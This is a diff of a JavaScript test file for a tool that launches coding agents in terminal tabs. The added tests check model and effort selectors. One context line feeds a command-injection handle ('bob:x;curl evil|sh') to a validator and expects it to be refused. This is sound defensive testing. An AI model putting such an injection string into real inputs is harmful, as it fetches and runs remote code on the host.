@@ -462,7 +462,9 @@ describe('agentCmd', () => {
   test('codex agent: preflight, tab create -> agent start --kind/--pane -> wait until idle', () => {
     const { run, calls } = runner();
     const out = h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
-    expect(out).toEqual({ handle: 'jay', model: 'codex', pane_id: 'wR:p2', tab: 'wR:t2' });
+    expect(out).toEqual({
+      handle: 'jay', kind: 'codex', model: null, effort: null, pane_id: 'wR:p2', tab: 'wR:t2',
+    });
     expect(calls).toEqual([
       ['herdr', 'agent', 'list'],
       ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus'],
@@ -503,6 +505,35 @@ describe('agentCmd', () => {
     expect(() => h.agentCmd(['opencode', 'bob:x;curl evil|sh', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
       .toThrow(/unsafe characters/);
     expect(calls).toEqual([]);
+  });
+
+  // The `agent` verb shares makeAgent with `up`, so the selector must work here
+  // too - this is the verb used to add one agent to a herd that already exists.
+  test('claude agent passes model/effort after -- and reports what it selected', () => {
+    const { run, calls } = runner();
+    const out = h.agentCmd(['claude', 'nell:model=opus,effort=high',
+      '--workspace', 'wR', '--cwd', '/wt/x'], { run });
+    expect(out).toEqual({
+      handle: 'nell', kind: 'claude', model: 'opus', effort: 'high', pane_id: 'wR:p2', tab: 'wR:t2',
+    });
+    expect(calls).toContainEqual(
+      ['herdr', 'agent', 'start', 'nell', '--kind', 'claude', '--pane', 'wR:p2', '--timeout', '45000',
+        '--', '--model', 'opus', '--effort', 'high']);
+  });
+
+  test('codex agent renders effort as a -c config override', () => {
+    const { run, calls } = runner();
+    h.agentCmd(['codex', 'jay:effort=high', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
+    expect(calls).toContainEqual(
+      ['herdr', 'agent', 'start', 'jay', '--kind', 'codex', '--pane', 'wR:p2', '--timeout', '45000',
+        '--', '-c', 'model_reasoning_effort=high']);
+  });
+
+  test('the tab label still uses the bare handle, not the selector', () => {
+    const { run, calls } = runner();
+    h.agentCmd(['claude', 'nell:model=opus', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
+    expect(calls).toContainEqual(
+      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'nell ◆', '--no-focus']);
   });
 });
 
@@ -906,6 +937,11 @@ describe('usage / --help', () => {
   });
   test('usage warns that the native agent wait needs one --until per status, not a comma list', () => {
     expect(h.usage()).toMatch(/herdr agent wait.*one\b/i);
+  });
+  test('usage documents the model/effort selector and that a bare handle inherits', () => {
+    expect(h.usage()).toMatch(/model=/);
+    expect(h.usage()).toMatch(/effort=/);
+    expect(h.usage()).toMatch(/inherit/i);
   });
 });
 
